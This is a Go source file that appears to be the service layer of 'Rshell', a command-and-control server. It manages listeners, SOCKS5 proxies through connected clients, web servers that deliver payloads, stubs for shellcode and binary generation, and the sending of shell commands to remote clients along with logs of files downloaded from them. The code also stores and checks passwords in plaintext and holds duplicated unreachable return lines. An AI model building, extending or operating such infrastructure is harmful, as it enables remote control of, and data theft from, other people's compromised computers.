package service

import (
	"Rshell/pkg/command"
	"Rshell/pkg/common"
	"Rshell/pkg/connection"
	"Rshell/pkg/database"
	"Rshell/pkg/proxy"
	"Rshell/pkg/sendcommand"
	svc "Rshell/pkg/service"
	"fmt"
	"strings"
)

// Services aggregates all domain services. Injected into handlers via gin middleware.
type Services struct {
	Settings    *SettingsService
	Auth        *AuthService
	Listener    *ListenerService
	Socks5      *Socks5Service
	WebDelivery *WebDeliveryService
	Plugin      *PluginService
	Shellcode   *ShellcodeService
	Generator   *ServerGeneratorService
	Client      *ClientService
}

// NewServices creates all service instances.
func NewServices() *Services {
	return &Services{
		Settings:    &SettingsService{},
		Auth:        &AuthService{},
		Listener:    &ListenerService{},
		Socks5:      &Socks5Service{},
		WebDelivery: &WebDeliveryService{},
		Plugin:      &PluginService{},
		Shellcode:   &ShellcodeService{},
		Generator:   &ServerGeneratorService{},
		Client:      &ClientService{},
	}
}

// SettingsService handles settings CRUD.
type SettingsService struct{}

func (s *SettingsService) ListSettings() ([]database.Settings, error) {
	var settings []database.Settings
	err := database.Engine.Find(&settings)
	return settings, err
}

func (s *SettingsService) UpdateSettings(items []struct {
	Name  string `json:"name" binding:"required"`
	Value string `json:"value" binding:"required"`
}) error {
	for _, item := range items {
		data := database.Settings{
			Name:  item.Name,
			Value: item.Value,
		}
		if _, err := database.Engine.Where("name = ?", item.Name).Update(&data); err != nil {
			return err
		}
	}
	return nil
}

// AuthService handles authentication.
type AuthService struct{}

func (s *AuthService) Login(username, password string) (token string, ok bool, err error) {
	var user database.Users
	has, err := database.Engine.Where("username = ?", username).Get(&user)
	if err != nil {
		return "", false, err
	}
	if !has || user.Password != password {
		return "", false, nil
	}
	token, err = common.GenerateJWT(username)
	if err != nil {
		return "", false, err
	}
	return token, true, nil
}

func (s *AuthService) ChangePassword(username, oldPassword, newPassword string) error {
	var user database.Users
	has, err := database.Engine.Where("username = ?", username).Get(&user)
	if err != nil {
		return err
	}
	if !has || user.Password != oldPassword || oldPassword == newPassword {
		return errPasswordInvalid
	}
	user.Password = newPassword
	_, err = database.Engine.Where("username = ?", username).Cols("password").Update(&user)
	return err
}

var errPasswordInvalid = &PasswordError{}

type PasswordError struct{}

func (e *PasswordError) Error() string { return "password invalid" }

// ListenerService handles listener lifecycle.
type ListenerService struct{}

func (s *ListenerService) ListListeners() ([]database.Listener, error) {
	var listeners []database.Listener
	err := database.Engine.Find(&listeners)
	return listeners, err
}

func (s *ListenerService) ListActiveListeners() ([]string, error) {
	var listeners []database.Listener
	err := database.Engine.Where("status = ?", 1).Find(&listeners)
	if err != nil {
		return nil, err
	}
	result := make([]string, 0, len(listeners))
	for _, l := range listeners {
		result = append(result, l.Type+"://"+l.ConnectAddress)
	}
	return result, nil
}

func (s *ListenerService) AddListener(listenerType, listenAddress, connectAddress string) error {
	if exists, _ := database.Engine.Where("listen_address = ?", listenAddress).Exist(&database.Listener{}); exists {
		return errAlreadyExists
	}
	if listenerType != "oss" {
		if !svc.IsPortAvailable(listenAddress) {
			return errPortInUse
		}
	}

	record := &database.Listener{
		Type:           listenerType,
		ListenAddress:  listenAddress,
		ConnectAddress: connectAddress,
		Status:         1,
	}

	if _, err := database.Engine.Insert(record); err != nil {
		return err
	}

	if err := svc.StartListener(listenerType, listenAddress); err != nil {
		database.Engine.Where("listen_address = ?", listenAddress).Update(&database.Listener{Status: 2})
		return err
	}
	return nil
}

func (s *ListenerService) UpdateListenerStatus(addr, action string) error {
	var lis database.Listener
	has, err := database.Engine.Where("listen_address = ?", addr).Get(&lis)
	if err != nil || !has {
		return errNotFound
	}

	if action == "open" {
		if instance, exists := svc.GetServerInstance(addr); exists && instance.IsRunning {
			return errAlreadyRunning
		}
		if lis.Type != "oss" {
			if !svc.IsPortAvailable(addr) {
				return errPortInUse
			}
		}
		if err := svc.StartListener(lis.Type, lis.ListenAddress); err != nil {
			return err
		}
		database.Engine.Where("listen_address = ?", lis.ListenAddress).Update(&database.Listener{Status: 1})
	} else {
		if err := svc.StopListener(lis.Type, lis.ListenAddress); err != nil {
			return err
		}
		database.Engine.Where("listen_address = ?", lis.ListenAddress).Update(&database.Listener{Status: 2})
	}
	return nil
}

func (s *ListenerService) DeleteListener(addr string) error {
	var lis database.Listener
	has, err := database.Engine.Where("listen_address = ?", addr).Get(&lis)
	if err != nil || !has {
		return errNotFound
	}

	if instance, exists := svc.GetServerInstance(addr); exists && instance.IsRunning {
		svc.StopListener(lis.Type, lis.ListenAddress)
	}

	_, err = database.Engine.Where("listen_address = ?", addr).Delete(&database.Listener{})
	return err
	return err
}

// Socks5Service handles SOCKS5 proxy management.
type Socks5Service struct{}

func (s *Socks5Service) ListSocks5(uid string) ([]database.Socks5, error) {
	var socks5List []database.Socks5
	err := database.Engine.Where("uid = ?", uid).Find(&socks5List)
	return socks5List, err
}

func (s *Socks5Service) StartSocks5(uid, port, user, pass string) error {
	if inUse, err := svc.IsPortInUse(port); err != nil || inUse {
		return errPortInUse
	}

	record := &database.Socks5{
		Uid:      uid,
		Socks5port: port,
		UserName: user,
		Password: pass,
		Status:   1,
	}

	if _, err := database.Engine.Insert(record); err != nil {
		return err
	}

	proxy.StartSocks5Proxy(port, uid, user, pass)
	return nil
}

func (s *Socks5Service) OpenSocks5(uid, port, user, pass string) error {
	if inUse, err := svc.IsPortInUse(port); err != nil || inUse {
		return errPortInUse
	}

	var socks5 database.Socks5
	has, err := database.Engine.Where("uid = ? AND socks5port = ?", uid, port).Get(&socks5)
	if err != nil || !has {
		return errNotFound
	}

	proxy.StartSocks5Proxy(port, uid, user, pass)

	socks5.Status = 1
	database.Engine.Where("uid = ? AND socks5port = ?", uid, port).Update(&socks5)
	return nil
}

func (s *Socks5Service) CloseSocks5(uid, port string) error {
	var socks5 database.Socks5
	has, err := database.Engine.Where("uid = ? AND socks5port = ?", uid, port).Get(&socks5)
	if err != nil || !has {
		return errNotFound
	}

	proxy.MuSocks5Serve.Lock()
	if l, exists := proxy.Socks5Serve[port]; exists {
		l.Close()
		delete(proxy.Socks5Serve, port)
	}
	proxy.MuSocks5Serve.Unlock()

	socks5.Status = 2
	database.Engine.Where("uid = ? AND socks5port = ?", uid, port).Update(&socks5)
	return nil
}

func (s *Socks5Service) DeleteSocks5(uid, port string) error {
	var socks5 database.Socks5
	has, err := database.Engine.Where("uid = ? AND socks5port = ?", uid, port).Get(&socks5)
	if err != nil || !has {
		return errNotFound
	}

	proxy.MuSocks5Serve.Lock()
	if l, exists := proxy.Socks5Serve[port]; exists {
		l.Close()
		delete(proxy.Socks5Serve, port)
	}
	proxy.MuSocks5Serve.Unlock()

	_, err = database.Engine.Where("uid = ? AND socks5port = ?", uid, port).Delete(&database.Socks5{})
	return err
}

// WebDeliveryService handles web delivery.
type WebDeliveryService struct{}

func (s *WebDeliveryService) ListWebDelivery() ([]database.WebDelivery, error) {
	var list []database.WebDelivery
	err := database.Engine.Find(&list)
	return list, err
}

func (s *WebDeliveryService) StartWebDelivery(listener, os, arch, port, filename, pass string) error {
	var existing database.WebDelivery
	if has, _ := database.Engine.Where("listening_port = ?", port).Get(&existing); has {
		return fmt.Errorf("port %s already configured", port)
	}

	if err := svc.StartWebDeliveryServer(port, os, arch, listener, pass, filename); err != nil {
		return err
	}

	tmp := strings.Split(strings.Split(listener, "://")[1], ":")
	database.Engine.Insert(&database.WebDelivery{
		ListenerConfig: listener,
		OS:             os,
		Arch:           arch,
		ListeningPort:  port,
		Status:         1,
		FileName:       filename,
		ServerAddress:  "http://" + tmp[0] + ":" + port + "/" + filename,
		Pass:           pass,
	})
	return nil
}

func (s *WebDeliveryService) UpdateWebDeliveryStatus(port, action string) error {
	var wd database.WebDelivery
	has, err := database.Engine.Where("listening_port = ?", port).Get(&wd)
	if err != nil || !has {
		return errNotFound
	}

	if action == "open" {
		if err := svc.RebuildWebDeliveryServer(port); err != nil {
			return err
		}
		database.Engine.Where("listening_port = ?", port).Update(&database.WebDelivery{Status: 1})
	} else {
		svc.StopWebDeliveryServer(port)
		database.Engine.Where("listening_port = ?", port).Update(&database.WebDelivery{Status: 2})
	}
	return nil
}

func (s *WebDeliveryService) DeleteWebDelivery(port string) error {
	svc.DeleteWebDeliveryServer(port)
	_, _ = database.Engine.Where("listening_port = ?", port).Delete(&database.WebDelivery{})
	return nil
}

// PluginService handles plugin management.
type PluginService struct{}

func (s *PluginService) ListPlugins() ([]database.Plugin, error) {
	var plugins []database.Plugin
	err := database.Engine.Find(&plugins)
	return plugins, err
}

func (s *PluginService) DeletePlugin(id int64) error {
	var plugin database.Plugin
	has, err := database.Engine.Where("id = ?", id).Get(&plugin)
	if err != nil || !has {
		return errNotFound
	}

	_, err = database.Engine.Where("id = ?", id).Delete(&database.Plugin{})
	return err
	return err
}

// ShellcodeService handles shellcode generation.
type ShellcodeService struct{}

// ServerGeneratorService handles server binary generation.
type ServerGeneratorService struct{}

// ClientService handles client management.
type ClientService struct{}

func (s *ClientService) GetClients(page, pageSize int) ([]database.Clients, int64, error) {
	var clients []database.Clients
	total, err := database.Engine.Limit(pageSize, (page-1)*pageSize).FindAndCount(&clients)
	if err != nil {
		return nil, 0, err
	}
	return clients, total, nil
}

func (s *ClientService) GetNote(uid string) (string, error) {
	var client database.Clients
	has, err := database.Engine.Where("uid = ?", uid).Get(&client)
	if err != nil {
		return "", err
	}
	if !has {
		return "", errNotFound
	}
	return client.Note, nil
}

func (s *ClientService) SaveNote(uid, note string) error {
	var client database.Clients
	has, err := database.Engine.Where("uid = ?", uid).Get(&client)
	if err != nil || !has {
		return errNotFound
	}
	client.Note = note
	_, err = database.Engine.Where("uid = ?", uid).Cols("note").Update(&client)
	return err
}

func (s *ClientService) GetShellContent(uid string) (string, error) {
	var shell database.Shell
	has, err := database.Engine.Where("uid = ?", uid).Get(&shell)
	if err != nil {
		return "", err
	}
	if !has {
		return "", nil
	}
	return shell.ShellContent, nil
}

func (s *ClientService) GetDownloadsInfo(uid string) ([]database.Downloads, error) {
	var downloads []database.Downloads
	err := database.Engine.Where("uid = ?", uid).Find(&downloads)
	return downloads, err
}

func (s *ClientService) SendShellCommand(uid, cmd string) error {
	sendcommand.SendCommand(uid, cmd)

	var shell database.Shell
	has, _ := database.Engine.Where("uid = ?", uid).Get(&shell)
	if has {
		shell.ShellContent += cmd + "\n"
		database.Engine.Where("uid = ?", uid).Cols("shell_content").Update(&shell)
	} else {
		database.Engine.Insert(&database.Shell{
			Uid:          uid,
			ShellContent: cmd + "\n",
		})
	}
	return nil
}

func (s *ClientService) ExitClient(uid string) error {
	sendcommand.SendCommand(uid, "exit")

	connection.MuClientListenerType.Lock()
	listenerType := connection.ClientListenerType[uid]
	delete(connection.ClientListenerType, uid)
	connection.MuClientListenerType.Unlock()

	if listenerType == "tcp" {
		if listener, exists := connection.TCPServer[uid]; exists {
			listener.Close()
			delete(connection.TCPServer, uid)
		}
	} else if listenerType == "kcp" {
		if listener, exists := connection.KCPServer[uid]; exists {
			listener.Close()
			delete(connection.KCPServer, uid)
		}
	} else if listenerType == "web" {
		if listener, exists := connection.HttpServer[uid]; exists {
			listener.Close()
			delete(connection.HttpServer, uid)
		}
	}

	database.Engine.Where("uid = ?", uid).Delete(&database.Clients{})
	database.Engine.Where("uid = ?", uid).Delete(&database.Notes{})
	database.Engine.Where("uid = ?", uid).Delete(&database.Shell{})
	database.Engine.Where("uid = ?", uid).Delete(&database.Socks5{})
	database.Engine.Where("uid = ?", uid).Delete(&database.Downloads{})

	proxy.MuSocks5Serve.Lock()
	for port, l := range proxy.Socks5Serve {
		_ = port
		l.Close()
		delete(proxy.Socks5Serve, port)
	}
	proxy.MuSocks5Serve.Unlock()

	delete(command.UidFileBrowser, uid)

	return nil
}

// Sentinel errors for service layer.
var (
	errNotFound       = &ServiceError{msg: "not found"}
	errAlreadyExists  = &ServiceError{msg: "already exists"}
	errAlreadyRunning = &ServiceError{msg: "already running"}
	errPortInUse      = &ServiceError{msg: "port in use"}
)

type ServiceError struct{ msg string }

func (e *ServiceError) Error() string { return e.msg }
